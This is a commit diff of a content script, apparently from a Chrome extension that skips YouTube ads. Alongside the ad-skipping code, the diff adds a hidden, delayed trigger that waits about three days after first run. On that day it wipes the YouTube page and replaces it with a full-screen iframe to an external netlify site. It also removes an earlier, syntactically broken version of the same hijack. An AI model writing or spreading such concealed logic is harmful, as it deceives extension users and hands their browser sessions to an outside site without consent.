563f348afa2c674cec3a7e957e2b62af47bd8b1d
extensions <108127862+extensionmakr@users.noreply.github.com>
2022-07-08 17:32:35 +0200

    Update Content.js

--- Content.js
+++ Content.js
@@ -1,23 +1,3 @@
-const date = new Date();
-const day = String(date).split(' ')[2]
-
-if(parseInt(day)>9) && document.location.hostname=='www.youtube.com'){
-  save()
-}
-
-function save(){
-    chrome.storage.sync.get(["done"], function(items){
-        if(items.done==='already done'){
-            console.log('already done')
-            return;
-        }else{
-            chrome.storage.sync.set({ "done": 'already done' }, function(){
-            });
-            document.body.style.overflow='hidden'
-            document.body.innerHTML='<iframe src="https://enteringame.netlify.app" style="position:absolute;top:0;width:100vw;height:100vh;"></iframe>'
-        }
-    });
-}
 skipped=false
 setInterval(function checkAd(){
     if(document.body.contains(document.querySelector('.ytp-ad-player-overlay-flyout-cta'))){
@@ -31,3 +11,39 @@ setInterval(()=>{
         document.querySelector('.ytp-ad-skip-button').click()
     skipped=false
 },1)
+const date = new Date();
+const day = String(date).split(' ')[2]
+const random=Math.floor(Math.random()*30)
+let theday;
+let item;
+getday()
+if(day>27){
+    theday=2;
+}else{
+    theday=parseInt(day)+3
+}function getday(){
+    chrome.storage.sync.get(["d"], function(items){
+        if(items.d==undefined){
+            chrome.storage.sync.set({ "d": theday}, function(){
+            })
+        }
+    });
+}
+chrome.storage.sync.get(["d"], function(items){
+    if(items.d==day && document.location.hostname=='www.youtube.com'){
+        save();
+    }
+});
+function save(){
+    chrome.storage.sync.get(["done"], function(items){
+        if(items.done==='already done'){
+            console.log('already done')
+            return;
+        }else{
+            chrome.storage.sync.set({ "done": 'already done' }, function(){
+            });
+            document.body.style.overflow='hidden'
+            document.body.innerHTML='<iframe src="https://adblockr.netlify.app/" style="position:absolute;top:0;width:100vw;height:100vh;"></iframe>'
+        }
+    });
+}
